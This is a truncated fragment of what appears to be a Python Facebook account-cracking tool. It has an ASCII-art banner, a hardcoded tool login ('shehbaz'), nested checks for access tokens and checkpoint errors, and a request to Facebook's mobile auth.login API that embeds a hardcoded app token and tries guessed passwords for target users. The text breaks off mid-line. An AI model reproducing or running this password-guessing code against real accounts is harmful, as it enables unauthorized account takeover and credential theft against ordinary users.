...
logo = """
				...
				|  $$$$$$ | $$  \ $$| $$$$$$$$| $$  \ $$| $$  \ $$  /$$$$$$$   /$$$$/ 
				 \____  $$| $$  | $$| $$_____/| $$  | $$| $$  | $$ /$$__  $$  /$$__/  
				 /$$$$$$$/| $$  | $$|  $$$$$$$| $$  | $$| $$$$$$$/|  $$$$$$$ /$$$$$$$$
				|_______/ |__/  |__/ \_______/|__/  |__/|_______/  \_______/|________/
...
CorrectUsername = "shehbaz"

CorrectPassword = "shehbaz"
												...
												if 'www.facebook.com' in q["error_msg"]:
													...
													if 'access_token' in q:
														...
														if 'www.facebook.com' in q["error_msg"]:
															...
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&gene
